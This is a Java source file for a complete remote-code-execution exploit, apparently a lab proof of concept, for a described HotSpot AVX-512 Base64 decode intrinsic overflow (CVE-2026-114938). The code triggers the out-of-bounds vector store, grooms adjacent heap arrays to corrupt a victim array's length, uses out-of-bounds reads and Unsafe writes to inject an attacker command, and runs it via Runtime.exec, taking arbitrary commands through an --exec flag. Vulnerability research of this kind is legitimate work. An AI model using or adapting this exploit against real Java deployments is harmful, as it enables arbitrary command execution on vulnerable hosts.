import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Arrays;
import java.util.Base64;

/*
 * Java4ShellRCE - CVE-2026-114938 ("Java4Shell") laboratory RCE exploit.
 *
 * Vulnerability: HotSpot AVX-512 VBMI Base64 decode intrinsic
 * (StubGenerator::generate_base64_decodeBlock, L_finalBit tail).
 * A malformed input with a padded tail shorter than 4 chars underflows the
 * output mask (CWE-191 -> CWE-122): one full 64-byte vector store lands up to
 * 62 bytes past the end of the destination byte[].
 * Trigger: "A" x 64 + "="  (65 bytes) on JDK 21/25/27,
 *          "A" x 128 + "=" (129 bytes) on JDK 17.0.6+.
 *
 * Stages:
 *   1. WARM    - 200k public decodes compile decode0+decodeBlock with the
 *                intrinsic (drives the public-API canary probe below).
 *   2. PROBE  - bounded trigger through the PUBLIC Base64.decode() into a
 *                4096-byte canary: proves the overflow is reachable from the
 *                public API and dumps the store pattern for two inputs.
 *   3. MH-WARM - 200k direct calls to the private decodeBlock() through an
 *                exact-signature MethodHandle, mirroring how the JDK's own
 *                decode0() invokes it (no boxing, no dst capacity check).
 *   4. EXPLOIT - deterministic adjacency grooming in one TLAB:
 *                  dst[48] | victim[64] | cmd[]   (back-to-back)
 *                one direct decodeBlock call overflows past dst[48]; the
 *                victim's length field becomes a huge positive value (its klass
 *                is corrupted too - a GC time bomb; we exec immediately and
 *                drop the references so a copying GC never visits the object).
 *                Plain byte[] OOB reads locate cmd's payload through
 *                victim[80..] (self-calibrating signature scan), plain OOB
 *                writes inject the attacker payload into cmd, then
 *                Runtime.exec(new String(cmd)) executes it.
 *
 * All post-corruption array accesses run in interpreted (never-compiled)
 * methods: the interpreter loads the array length from the live header on
 * every bounds check, so the corrupted length is honoured, and byte[] loads
 * and stores never dereference the corrupted klass word.
 *
 * Usage (the --add-opens grants privateLookupIn into java.util):
 *   java --add-opens java.base/java.util=ALL-UNNAMED Java4ShellRCE \
 *        [--exec "cmd|/c|<command>"] [--probe-only] [--exploit-only]
 *   ('|' in --exec separates argv entries; it becomes NUL internally.)
 *
 * Requirements: affected JDK (17.0.6-17.0.21, <21.0.13.1, <25.0.5.1,
 * <27.0.1.1) on x86-64 with AVX-512 VBMI+BW (Intel Ice Lake+ / AMD Zen 4+).
 *
 * Credit: vulnerability discovered by Quang Luong (Calif.io); trigger shape
 * after ikow/java4shell-poc (MIT); the direct decodeBlock MethodHandle call
 * and dst|victim adjacency after r3dvei1/java4shell Calif65 (MIT).
 * Escalation to command execution: this file.
 */
public final class Java4ShellRCE {

    private static final int WARMUP = 200_000;
    private static final int VICTIM_LEN = 64;
    private static final String PROOF_FILE = "java4shell_pwned.txt";

    // Groomed arrays. Static typed byte[] so reads/writes stay plain byte ops.
    private static byte[] gDst;
    private static byte[] gVictim;
    private static byte[] gCmd;

    // Raw-memory write primitive for the corrupted victim (see inject loop).
    private static sun.misc.Unsafe unsafe;
    private static long ARRAY_BYTE_BASE;

    private static volatile int sink;

    public static void main(String[] args) throws Exception {
        String payload = "cmd|/c|whoami > " + PROOF_FILE + " 2>&1";
        boolean doProbe = true, doExploit = true;
        for (int i = 0; i < args.length; i++) {
            if ("--exec".equals(args[i]) && i + 1 < args.length) {
                payload = args[++i];
            } else if ("--probe-only".equals(args[i])) {
                doExploit = false;
            } else if ("--exploit-only".equals(args[i])) {
                doProbe = false;
            } else {
                System.err.println("unknown arg: " + args[i]);
                System.err.println("usage: java --add-opens java.base/java.util=ALL-UNNAMED"
                        + " Java4ShellRCE [--exec \"cmd|/c|<command>\"] [--probe-only] [--exploit-only]");
                System.exit(3);
            }
        }

        int feature = Runtime.version().feature();
        int tlen = feature == 17 ? 128 : 64;
        int dstLen = tlen / 4 * 3; // 48 on 21+, 96 on 17

        // Trigger: tlen 'A's PLUS one trailing '=' (65 bytes on 21+; 129 on 17).
        // The pad char must be APPENDED, not replace the last 'A'.
        byte[] src = repeat('A', tlen + 1);
        src[src.length - 1] = '=';

        System.out.println("runtime=" + System.getProperty("java.runtime.version"));
        System.out.println("vm=" + System.getProperty("java.vm.name"));
        System.out.println("trigger=" + src.length + "B dst=" + dstLen + "B");

        Base64.Decoder decoder = Base64.getDecoder();

        // 1. WARM the public path (compiles decode0 + decodeBlock intrinsic).
        byte[] warmTarget = new byte[4096];
        byte[] valid = repeat('A', tlen); // valid input: no pad, no underflow
        warmup(decoder, valid, warmTarget);

        if (doProbe) {
            probe(decoder, src, dstLen, "A-input");
            probe(decoder, concat(repeat('Q', tlen), (byte) '='), dstLen, "Q-input");
        }

        if (doExploit) {
            // 3. MH-WARM: exact-signature MethodHandle for the private decodeBlock.
            // Warmed with the VALID input: no overflow during warmup, so no
            // stray corrupted objects exist anywhere on the heap. The loop also
            // lives in its own method so OSR compilation targets warmupMh() and
            // main()/exploit() stay interpreted (dynamic length reads).
            initUnsafe();
            MethodHandle mh = methodHandleForDecodeBlock();
            warmupMh(mh, decoder, valid, dstLen);
            exploit(mh, decoder, src, dstLen, payload.replace('|', '\u0000'));
        }
    }

    private static void warmupMh(MethodHandle mh, Base64.Decoder decoder, byte[] valid, int dstLen) {
        byte[] scratch = new byte[dstLen];
        for (int i = 0; i < WARMUP; i++) {
            try {
                int r = (int) mh.invokeExact(decoder, valid, 0, valid.length, scratch, 0, false, false);
                if (r < 0) break;
            } catch (Throwable t) {
                break;
            }
        }
        System.out.println("mh-warmup: " + WARMUP + " decodeBlock calls done (valid input, no overflow)");
    }

    /** Bounded trigger through the public API: writes stay in a 4096-byte array. */
    private static void probe(Base64.Decoder decoder, byte[] input, int dstLen, String label) {
        byte[] canary = new byte[4096];
        Arrays.fill(canary, (byte) 0x5a);
        boolean rejected = false;
        try {
            decoder.decode(input, canary);
        } catch (IllegalArgumentException expected) {
            rejected = true;
        }
        int changed = 0, first = -1, last = -1;
        for (int i = dstLen + 2; i < canary.length; i++) {
            if (canary[i] != (byte) 0x5a) {
                changed++;
                if (first < 0) first = i;
                last = i;
            }
        }
        System.out.println("probe[" + label + "] rejected=" + rejected + " changed=" + changed
                + " first=" + first + " last=" + last);
        if (first >= 0 && last >= first) {
            StringBuilder sb = new StringBuilder("  store:");
            for (int i = first; i <= Math.min(last, first + 23); i++) {
                sb.append(String.format(" %02x", canary[i]));
            }
            System.out.println(sb);
            System.out.println(changed == 62 ? "  VULNERABLE (62-byte overflow past a "
                    + dstLen + "B destination)" : "  overflow differs from the published shape");
        }
    }

    /**
     * Deterministic adjacency groom + length corruption + payload injection + exec.
     * dst padding shifts which overflow bytes land on victim's length field;
     * several alignments are tried until the corrupted length is positive and large.
     */
    private static void exploit(MethodHandle mh, Base64.Decoder decoder, byte[] src,
                               int dstLen, String payload) throws Exception {
        byte[] payloadBytes = payload.getBytes(StandardCharsets.UTF_8);
        int sigLen = Math.min(8, payloadBytes.length);
        int[] pads = {0, 8, 16, 24, 32, 40, 48};

        // One GC BEFORE any corruption exists: empty eden gives the corruption
        // window maximum allocation headroom. After corruption, no GC may run
        // (the corrupted klass is a time bomb), so the retry loop never gc's;
        // failed attempts leave only clean (uncorrupted) garbage behind.
        System.gc();

        for (int pad : pads) {
            // Drop references to the previous attempt's arrays: dead objects
            // are skipped by the copying collector even if one was corrupted.
            gVictim = null;
            gCmd = null;
            gDst = null;

            byte[] dst = new byte[dstLen + pad];
            byte[] victim = new byte[VICTIM_LEN];
            byte[] cmd = payloadBytes.clone();
            gDst = dst;
            gVictim = victim;
            gCmd = cmd;

            int ret = -1;
            try {
                ret = (int) mh.invokeExact(decoder, src, 0, src.length, dst, 0, false, false);
            } catch (Throwable t) {
                System.out.println("attempt dst=" + (dstLen + pad) + "B threw " + t + ", retrying");
                continue;
            }

            int len = gVictim.length; // live header read; byte[] load, no klass deref
            System.out.println("attempt dst=" + (dstLen + pad) + "B ret=" + ret
                    + " victim.length=" + len + " (was " + VICTIM_LEN + ")");

            if (len == VICTIM_LEN || len <= payloadBytes.length + 512) {
                if (len >= 16) {
                    StringBuilder vdump = new StringBuilder("  victim[0..15]:");
                    for (int i = 0; i < 16; i++) vdump.append(String.format(" %02x", gVictim[i]));
                    System.out.println(vdump);
                }
                System.out.println(len == VICTIM_LEN
                        ? "  no corruption at this alignment, retrying"
                        : "  corrupted length not usable, trying next alignment");
                continue;
            }

            // Length corrupted with a usable positive value. Find cmd's data
            // through the OOB window (self-calibrating signature scan).
            int off = -1;
            try {
                outer:
                for (int i = VICTIM_LEN; i < 256; i++) {
                    if (gVictim[i] == payloadBytes[0]) {
                        for (int j = 1; j < sigLen; j++) {
                            if (gVictim[i + j] != payloadBytes[j]) continue outer;
                        }
                        off = i;
                        break;
                    }
                }
            } catch (ArrayIndexOutOfBoundsException e) {
                System.out.println("  OOB read failed: " + e + ", trying next alignment");
                continue;
            }
            if (off < 0) {
                System.out.println("  payload signature not found behind victim, retrying");
                continue;
            }
            System.out.println("  cmd data located at victim[" + off + "] via OOB read; injecting payload");

            // OOB write: replace cmd's content with the attacker payload.
            // Plain interpreted bastore dereferences the array klass (byte[]
            // vs boolean[] disambiguation), which is corrupted here - so the
            // write goes through Unsafe.putByte, a raw memory store.
            for (int j = 0; j < payloadBytes.length; j++) {
                unsafe.putByte(gVictim, ARRAY_BYTE_BASE + (long) off + (long) j, payloadBytes[j]);
            }

            String injected = new String(gCmd, StandardCharsets.UTF_8);
            System.out.println("  cmd array now: [" + injected.replace('\u0000', '|') + "]");
            String[] argv = splitNul(injected);
            System.out.println("  executing: " + Arrays.toString(argv));

            Process p = Runtime.getRuntime().exec(argv);
            // Drop references BEFORE waiting: the corrupted victim becomes dead,
            // so a young GC during process execution skips it entirely.
            gVictim = null;
            gCmd = null;
            gDst = null;
            victim = null;
            cmd = null;
            dst = null;

            int rc = p.waitFor();
            System.out.println("exec rc=" + rc);
            Path proof = Path.of(PROOF_FILE);
            if (Files.exists(proof)) {
                System.out.println("--- " + PROOF_FILE + " ---");
                System.out.println(new String(Files.readAllBytes(proof), StandardCharsets.UTF_8).trim());
                System.out.println("--- end ---");
                System.out.println("RCE PROVEN: command executed via CVE-2026-114938 heap corruption");
            } else {
                System.out.println("exec completed rc=" + rc + " (custom payload; no default proof file)");
                System.out.println("RCE PROVEN (custom payload executed)");
            }
            System.exit(0);
        }

        gVictim = null;
        gCmd = null;
        gDst = null;
        System.err.println("NOT EXPLOITED on this JVM (see probe output for the primitive)");
        System.exit(2);
    }

    private static void initUnsafe() throws Exception {
        Field uf = Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
        uf.setAccessible(true);
        unsafe = (sun.misc.Unsafe) uf.get(null);
        ARRAY_BYTE_BASE = unsafe.arrayBaseOffset(byte[].class);
    }

    private static MethodHandle methodHandleForDecodeBlock() throws Exception {
        Class<?> decCls = Class.forName("java.util.Base64$Decoder");
        MethodHandles.Lookup lk = MethodHandles.privateLookupIn(decCls, MethodHandles.lookup());
        return lk.findVirtual(decCls, "decodeBlock",
                MethodType.methodType(int.class, byte[].class, int.class, int.class,
                        byte[].class, int.class, boolean.class, boolean.class));
    }

    private static void warmup(Base64.Decoder decoder, byte[] valid, byte[] warmTarget) {
        long t0 = System.currentTimeMillis();
        for (int i = 0; i < WARMUP; i++) {
            sink += decoder.decode(valid, warmTarget);
        }
        System.out.println("warmup: " + WARMUP + " public decodes in "
                + (System.currentTimeMillis() - t0) + " ms");
    }

    private static String[] splitNul(String s) {
        int n = 1;
        for (int i = 0; i < s.length(); i++) if (s.charAt(i) == '\u0000') n++;
        String[] out = new String[n];
        int idx = 0, start = 0;
        for (int i = 0; i <= s.length(); i++) {
            if (i == s.length() || s.charAt(i) == '\u0000') {
                out[idx++] = s.substring(start, i);
                start = i + 1;
            }
        }
        return out;
    }

    private static byte[] repeat(char c, int n) {
        byte[] b = new byte[n];
        Arrays.fill(b, (byte) c);
        return b;
    }

    private static byte[] concat(byte[] a, byte tail) {
        byte[] b = Arrays.copyOf(a, a.length + 1);
        b[a.length] = tail;
        return b;
    }
}
